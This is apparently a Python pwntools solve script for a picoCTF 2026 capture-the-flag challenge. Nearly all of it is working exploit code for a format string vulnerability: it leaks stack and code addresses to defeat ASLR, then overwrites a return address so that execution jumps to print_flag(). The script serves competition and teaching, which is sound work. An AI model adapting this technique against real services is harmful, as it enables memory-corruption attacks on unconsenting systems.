#!/usr/bin/env python3
"""
Echo Escape 1 - picoCTF 2026 (Binary Exploitation, 100 pts)

Format string vulnerability exploit.
The echo service uses printf(buf) allowing us to leak addresses
and overwrite the return address to redirect execution to print_flag().

Based on the picoCTF "Echo Valley" pattern from 2025.

Usage:
    python3 solve.py [LOCAL_BINARY]      # Run locally
    python3 solve.py remote HOST PORT    # Run against remote

Requires: pwntools (pip install pwntools)
"""

import sys
from pwn import *

# ============================================================
# Configuration - update these with actual challenge values
# ============================================================
REMOTE_HOST = "shape-facility.picoctf.net"
REMOTE_PORT = 1337
BINARY_NAME = "./echo_escape"  # Local binary name

# Format string offset positions to leak addresses
# These may need adjustment based on the actual binary
STACK_LEAK_POS = 20    # Position that leaks a stack address
CODE_LEAK_POS = 21     # Position that leaks a code address (return addr)

# Offset between the leaked code address and the binary base
# This is calculated as: leaked_addr - base_addr (from GDB/debugging)
# Example: 0x555555555413 - 0x555555554000 = 0x1413
# Adjust this value based on the actual binary!
CODE_LEAK_OFFSET = 0x1413


def find_format_offset(binary_path):
    """
    Automatically determine the format string offset using pwntools FmtStr.
    This finds where our input appears on the stack.
    """
    def exec_fmt(payload):
        p = process(binary_path)
        p.recvuntil(b":", timeout=5)  # Wait for prompt
        p.sendline(payload)
        # Read the echoed output
        try:
            p.recvuntil(b": ", timeout=3)
            result = p.recv(timeout=2)
        except:
            result = p.recv(timeout=2)
        p.close()
        return result

    try:
        autofmt = FmtStr(exec_fmt)
        log.success(f"Format string offset: {autofmt.offset}")
        return autofmt.offset
    except Exception as e:
        log.warning(f"Auto-detection failed: {e}")
        log.info("Using default offset of 6 (common for x86_64)")
        return 6


def exploit_local(binary_path):
    """Exploit the local binary."""
    context.binary = binary_path
    e = ELF(binary_path)

    # Find format string offset
    offset = find_format_offset(binary_path)

    # Start the process
    r = process(binary_path)

    return exploit(r, e, offset)


def exploit_remote(host, port, binary_path=None):
    """Exploit the remote service."""
    if binary_path and os.path.exists(binary_path):
        context.binary = binary_path
        e = ELF(binary_path)
    else:
        # Without local binary, we use hardcoded values
        e = None
        log.warning("No local binary provided. Using estimated offsets.")

    r = remote(host, port)

    # For remote, we may need to guess the offset or use a default
    offset = 6  # Common default for x86_64

    return exploit(r, e, offset)


def exploit(r, elf_obj, fmt_offset):
    """
    Core exploitation logic.

    Phase 1: Leak addresses to defeat PIE/ASLR
    Phase 2: Overwrite return address with print_flag()
    Phase 3: Trigger the return
    """

    # ================================================================
    # Phase 1: Leak addresses
    # ================================================================
    log.info("Phase 1: Leaking addresses...")

    # Wait for the initial prompt/banner
    try:
        banner = r.recvuntil(b":", timeout=5)
        log.info(f"Banner: {banner.decode(errors='ignore').strip()}")
    except:
        pass

    # Send format string to leak stack and code addresses
    leak_payload = f"%{STACK_LEAK_POS}$p.%{CODE_LEAK_POS}$p".encode()
    r.sendline(leak_payload)

    # Parse the leaked addresses
    try:
        response = r.recvline(timeout=5)
        log.info(f"Leak response: {response}")

        # Try different parsing strategies
        resp_str = response.decode(errors="ignore").strip()

        # Remove any echo prefix (e.g., "You heard in the distance: ")
        if ":" in resp_str:
            resp_str = resp_str.split(":")[-1].strip()

        # Split on the delimiter we used
        parts = resp_str.split(".")
        if len(parts) >= 2:
            stack_addr_str = parts[0].strip()
            code_addr_str = parts[1].strip()
        else:
            # Try other delimiters
            parts = resp_str.split()
            stack_addr_str = parts[0].strip()
            code_addr_str = parts[1].strip() if len(parts) > 1 else parts[0]

        stack_address = int(stack_addr_str, 16)
        code_address = int(code_addr_str, 16)

        log.success(f"Leaked stack address: {hex(stack_address)}")
        log.success(f"Leaked code address:  {hex(code_address)}")

    except Exception as e:
        log.error(f"Failed to parse leaked addresses: {e}")
        log.info("Try adjusting STACK_LEAK_POS and CODE_LEAK_POS values")
        r.interactive()
        return

    # ================================================================
    # Phase 2: Calculate target addresses
    # ================================================================
    log.info("Phase 2: Calculating addresses...")

    # Calculate binary base address
    base_address = code_address - CODE_LEAK_OFFSET
    log.info(f"Binary base address: {hex(base_address)}")

    # Calculate return address location on stack
    # The return address is typically at stack_address + 8 (one pointer above)
    ret_address = stack_address + 8
    log.info(f"Return address location: {hex(ret_address)}")

    # Calculate print_flag address
    if elf_obj:
        print_flag_offset = elf_obj.sym.get("print_flag", None)
        if print_flag_offset is None:
            # Try alternative names
            for name in ["print_flag", "win", "get_flag", "flag", "read_flag"]:
                if name in elf_obj.sym:
                    print_flag_offset = elf_obj.sym[name]
                    break
        if print_flag_offset is None:
            log.error("Could not find print_flag symbol in binary!")
            log.info("Available symbols:")
            for sym in elf_obj.sym:
                log.info(f"  {sym}: {hex(elf_obj.sym[sym])}")
            r.interactive()
            return

        print_flag_addr = base_address + print_flag_offset
    else:
        # Without the binary, estimate the offset
        # Common offsets for small binaries
        print_flag_offset = 0x1229  # Placeholder -- adjust!
        print_flag_addr = base_address + print_flag_offset

    log.success(f"print_flag address: {hex(print_flag_addr)}")

    # ================================================================
    # Phase 3: Overwrite return address
    # ================================================================
    log.info("Phase 3: Crafting format string payload...")

    # Use pwntools fmtstr_payload to generate the write payload
    payload = fmtstr_payload(
        fmt_offset,
        {ret_address: print_flag_addr},
        write_size="short"  # Use 2-byte writes to keep payload small
    )

    log.info(f"Payload length: {len(payload)} bytes")

    if len(payload) > 99:
        log.warning(f"Payload ({len(payload)} bytes) may exceed buffer size (100 bytes)")
        log.info("Trying with byte-size writes...")
        payload = fmtstr_payload(
            fmt_offset,
            {ret_address: print_flag_addr},
            write_size="byte"
        )
        log.info(f"New payload length: {len(payload)} bytes")

    # Send the overwrite payload
    r.sendline(payload)

    # Receive the echo response
    try:
        r.recvline(timeout=3)
    except:
        pass

    # ================================================================
    # Phase 4: Trigger the return (send "exit")
    # ================================================================
    log.info("Phase 4: Triggering return to print_flag()...")
    r.sendline(b"exit")

    # ================================================================
    # Phase 5: Receive the flag
    # ================================================================
    log.info("Waiting for flag...")
    try:
        output = r.recvall(timeout=5)
        output_str = output.decode(errors="ignore")

        if "picoCTF{" in output_str:
            flag_start = output_str.index("picoCTF{")
            flag_end = output_str.index("}", flag_start) + 1
            flag = output_str[flag_start:flag_end]
            log.success(f"FLAG: {flag}")
            print(f"\n{flag}")
        else:
            log.info(f"Output received: {output_str}")
            log.warning("Flag not found in output. The exploit may need adjustment.")
    except:
        log.info("Dropping to interactive mode...")
        r.interactive()


def scan_stack(binary_path):
    """
    Utility: Scan the stack to find useful addresses.
    Helps determine the correct leak positions.
    """
    log.info("Scanning stack positions 1-40...")
    p = process(binary_path)

    try:
        p.recvuntil(b":", timeout=5)
    except:
        pass

    # Send a payload that leaks many stack positions
    payload = b".".join([f"%{i}$p".encode() for i in range(1, 41)])
    p.sendline(payload)

    try:
        response = p.recvline(timeout=5)
        resp_str = response.decode(errors="ignore")
        if ":" in resp_str:
            resp_str = resp_str.split(":")[-1].strip()

        values = resp_str.split(".")
        for i, val in enumerate(values, 1):
            val = val.strip()
            log.info(f"Position {i:2d}: {val}")
    except Exception as e:
        log.error(f"Scan failed: {e}")

    p.close()


if __name__ == "__main__":
    context.log_level = "info"

    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        # Remote exploitation
        host = sys.argv[2] if len(sys.argv) > 2 else REMOTE_HOST
        port = int(sys.argv[3]) if len(sys.argv) > 3 else REMOTE_PORT
        binary = sys.argv[4] if len(sys.argv) > 4 else BINARY_NAME

        log.info(f"Exploiting remote: {host}:{port}")
        exploit_remote(host, port, binary)

    elif len(sys.argv) > 1 and sys.argv[1] == "scan":
        # Stack scanning mode
        binary = sys.argv[2] if len(sys.argv) > 2 else BINARY_NAME
        scan_stack(binary)

    else:
        # Local exploitation
        binary = sys.argv[1] if len(sys.argv) > 1 else BINARY_NAME

        if not os.path.exists(binary):
            log.warning(f"Binary '{binary}' not found locally.")
            log.info(f"Attempting remote exploitation: {REMOTE_HOST}:{REMOTE_PORT}")
            exploit_remote(REMOTE_HOST, REMOTE_PORT)
        else:
            log.info(f"Exploiting local binary: {binary}")
            exploit_local(binary)
